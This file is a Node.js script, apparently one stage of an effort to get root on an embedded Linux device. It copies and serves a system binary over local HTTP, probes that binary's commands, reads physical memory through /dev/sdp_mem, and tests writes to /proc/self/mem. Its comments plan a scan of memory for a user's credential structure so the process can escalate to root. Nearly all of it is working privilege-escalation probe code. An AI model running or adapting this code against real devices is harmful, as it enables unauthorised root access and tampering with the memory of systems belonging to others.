// v22 - wasutility analysis + /dev/sdp_mem read + physical memory LPE attempt
// Pull server port 8095 (wasutility binary), 8096 (probe results)
try {
  var cp    = require('child_process');
  var fs    = require('fs');
  var http  = require('http');
  var lines = ['=== lpe-paths v22 ==='];

  // ---- 1. wasutility binary exfiltration ----
  var wasBuf = null;
  try {
    wasBuf = fs.readFileSync('/bin/wasutility');
    lines.push('wasutility_read: ' + wasBuf.length + ' bytes, magic=' + wasBuf.slice(0,4).toString('hex'));
    // Serve via HTTP on port 8095
    var binSrv = http.createServer(function(req, res) {
      res.writeHead(200, {'Content-Type': 'application/octet-stream',
                          'Content-Length': wasBuf.length});
      res.end(wasBuf);
    });
    binSrv.listen(8095, '127.0.0.1', function() {});
    binSrv.on('error', function(e) { lines.push('bin_srv_err: ' + e.message); });
  } catch(e) { lines.push('wasutility_read: threw ' + String(e.code||e.message)); }

  // ---- 2. wasutility invocation tests ----
  var wasArgs = [
    [],
    ['-h'],
    ['--help'],
    ['help'],
    ['list'],
    ['status'],
    ['version'],
    ['info'],
  ];
  wasArgs.forEach(function(args) {
    try {
      var r = cp.spawnSync('/bin/wasutility', args, {timeout: 2000});
      var out = ((r.stdout||'').toString() + (r.stderr||'').toString()).trim().substring(0,120);
      lines.push('was[' + args.join(' ') + ']: status=' + r.status + ' out=' + out);
    } catch(e) { lines.push('was[' + args.join(' ') + ']: threw ' + String(e.code||e.message)); }
  });

  // ---- 3. /dev/sdp_mem read at DRAM base ----
  var sdpFd = null;
  try {
    sdpFd = fs.openSync('/dev/sdp_mem', 'r+');
    lines.push('sdp_open: fd=' + sdpFd);

    // Test pread at DRAM base 0x20000000
    var physAddrs = [0x20000000, 0x20001000, 0x40000000, 0x60000000];
    physAddrs.forEach(function(addr) {
      try {
        var buf = new Buffer(16);
        var n = fs.readSync(sdpFd, buf, 0, 16, addr);
        lines.push('sdp_pread[0x' + addr.toString(16) + ']: ' + buf.slice(0,n).toString('hex'));
      } catch(e2) { lines.push('sdp_pread[0x' + addr.toString(16) + ']: ' + String(e2.code||e2.message)); }
    });

    // Test with position=null (read from start)
    try {
      var buf2 = new Buffer(16);
      var n2 = fs.readSync(sdpFd, buf2, 0, 16, null);
      lines.push('sdp_read_null: ' + buf2.slice(0,n2).toString('hex'));
    } catch(e3) { lines.push('sdp_read_null: ' + String(e3.code||e3.message)); }

  } catch(e) { lines.push('sdp_open: threw ' + String(e.code||e.message)); }

  // ---- 4. Scan for UID=5001 pattern in physical memory ----
  // 5001 = 0x1389, LE = 89 13 00 00
  // Look for pattern: uid uid uid uid gid gid gid gid ... in cred struct
  // Skip immediately — only run if pread works (checked in step 3)
  // We'll implement in service-v23 once we confirm read works

  // ---- 5. /proc/self/mem write test ----
  // Attempt: read a known value, overwrite with same value (non-destructive test)
  try {
    var memFd = fs.openSync('/proc/self/mem', 'r+');
    // The heap starts at 0x009a8000 (from maps). Try reading first few bytes.
    var maps = fs.readFileSync('/proc/self/maps', 'utf8');
    var heapLine = maps.split('\n').filter(function(l){ return l.indexOf('[heap]')!==-1; })[0]||'';
    var heapBase = parseInt(heapLine.split('-')[0], 16);
    lines.push('heap_base: 0x' + heapBase.toString(16));

    // Read 8 bytes from heap start
    var heapBuf = new Buffer(8);
    try {
      var hn = fs.readSync(memFd, heapBuf, 0, 8, heapBase);
      lines.push('heap_read: ' + heapBuf.slice(0,hn).toString('hex'));
      // Write same bytes back (non-destructive test)
      var wn = fs.writeSync(memFd, heapBuf, 0, hn, heapBase);
      lines.push('heap_write: wrote ' + wn + ' bytes back OK');
    } catch(e2) { lines.push('heap_rw: ' + String(e2.code||e2.message)); }

    fs.closeSync(memFd);
  } catch(e) { lines.push('proc_mem: ' + String(e.code||e.message)); }

  // ---- 6. strings from wasutility (look for command patterns) ----
  if (wasBuf) {
    // Extract printable strings >= 5 chars from the binary
    var strings = [];
    var cur = '';
    for (var i = 0; i < wasBuf.length; i++) {
      var c = wasBuf[i];
      if (c >= 0x20 && c <= 0x7e) {
        cur += String.fromCharCode(c);
      } else {
        if (cur.length >= 5) strings.push(cur);
        cur = '';
      }
    }
    if (cur.length >= 5) strings.push(cur);
    lines.push('was_strings_count: ' + strings.length);
    // Show strings that look like arguments/commands
    var interesting = strings.filter(function(s) {
      return s.indexOf('/') === 0 || s.indexOf('-') === 0 ||
             /^[a-z_][a-z_]+$/i.test(s) || s.indexOf('%') !== -1 ||
             s.indexOf('system') !== -1 || s.indexOf('exec') !== -1 ||
             s.indexOf('popen') !== -1 || s.indexOf('fork') !== -1 ||
             s.length > 20;
    });
    lines.push('was_interesting_strings: ' + JSON.stringify(interesting.slice(0,40)));
  }

  var body = lines.join('\n') + '\n=== END ===\n';
  try { fs.writeFileSync('/home/owner/share/tmp/sdk_tools/tbprobe22.txt', body); } catch(e) {}

  var pullSrv = http.createServer(function(req, res) {
    res.writeHead(200, {'Content-Type': 'text/plain'});
    res.end(body);
  });
  pullSrv.listen(8096, '127.0.0.1', function() {});
  pullSrv.on('error', function(e) {});
  setInterval(function() {}, 60000);

} catch(e) {
  try { require('fs').writeFileSync('/home/owner/share/tmp/sdk_tools/tbprobe22-crash.txt', String(e.stack||e.message)); } catch(e2) {}
}
